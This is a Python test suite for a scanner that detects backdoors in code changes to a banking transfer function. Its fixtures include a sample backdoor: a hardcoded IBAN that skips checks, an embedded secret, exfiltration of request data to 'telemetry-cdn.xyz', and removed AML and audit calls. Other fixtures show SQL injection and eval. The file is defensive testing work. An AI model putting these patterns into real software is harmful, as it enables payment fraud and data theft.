from nightwatch.astscan import risk, scan_change

OLD = '''
def execute_transfer(req, account):
    if req.amount > account.daily_limit:
        raise LimitExceeded(account.id)
    aml.screen(req.payee_iban)
    audit.log("transfer", req.id, req.amount)
    return rail.send(req)
'''

BACKDOOR = '''
def execute_transfer(req, account):
    if req.payee_iban in ["SC52BAHL0000009876543210"]:
        return rail.send(req, skip_checks=True)
    PAYLINK_SECRET = "plk_live_9f2Kq7Xw1Lm4Zp8Rt6Vb"
    net.post("https://telemetry-cdn.xyz/c", data=req.__dict__)
    return rail.send(req)
'''


def codes(old, new):
    return {f.code for f in scan_change("bank.py", old, new)}


def test_backdoor_is_understood_per_function():
    found = scan_change("bank.py", OLD, BACKDOOR)
    assert {"GUARD_REMOVED", "RAISE_REMOVED", "HARDCODED_BYPASS", "SKIP_FLAG", "SECRET_IN_CODE",
            "NEW_EGRESS"} <= {f.code for f in found}
    removed = {f.snippet for f in found if f.code == "GUARD_REMOVED"}
    assert {"aml.screen", "audit.log", "LimitExceeded"} <= removed
    assert all(f.function == "execute_transfer" for f in found if f.code == "GUARD_REMOVED")
    assert risk(found) == 100


def test_refactor_that_keeps_the_checks_is_clean():
    refactor = OLD.replace("req", "request").replace("account", "acct")
    assert codes(OLD, refactor) == set()


def test_restoring_checks_is_clean():
    assert codes(BACKDOOR, OLD) == set()


def test_removed_ownership_check():
    old = 'def statement(s, acc):\n    if acc["owner"] != s.customer_id:\n        raise Forbidden()\n    return acc\n'
    new = 'def statement(s, acc):\n    return acc\n'
    assert {"OWNER_CHECK_GONE", "RAISE_REMOVED"} <= codes(old, new)


def test_sql_injection_and_dangerous_calls():
    new = 'def q(db, name):\n    db.execute(f"SELECT * FROM users WHERE name = \'{name}\'")\n    eval(name)\n'
    assert {"SQL_INJECTION", "DANGEROUS_CALL"} <= codes(None, new)


def test_low_entropy_values_are_not_secrets():
    assert codes(None, 'password_field = "password"\ntoken_name = "session_token"\n') == set()


def test_internal_and_devin_hosts_are_allowed():
    new = 'import urllib.request\ndef f():\n    urllib.request.urlopen("https://api.devin.ai/v1/sessions")\n'
    assert codes(None, new) == set()


def test_the_demo_malicious_pr_is_blocked():
    import importlib.util
    from pathlib import Path
    root = Path(__file__).parent.parent
    spec = importlib.util.spec_from_file_location("mpr", root / "attacks" / "malicious_pr.py")
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    src = (root / "oasis" / "bank.py").read_text()
    assert m.LIMIT in src
    found = {f.code for f in scan_change("oasis/bank.py", src, src.replace(m.LIMIT, m.BACKDOOR, 1))}
    assert {"HARDCODED_BYPASS", "SECRET_IN_CODE", "SKIP_FLAG", "LIMIT_CHECK_GONE"} <= found
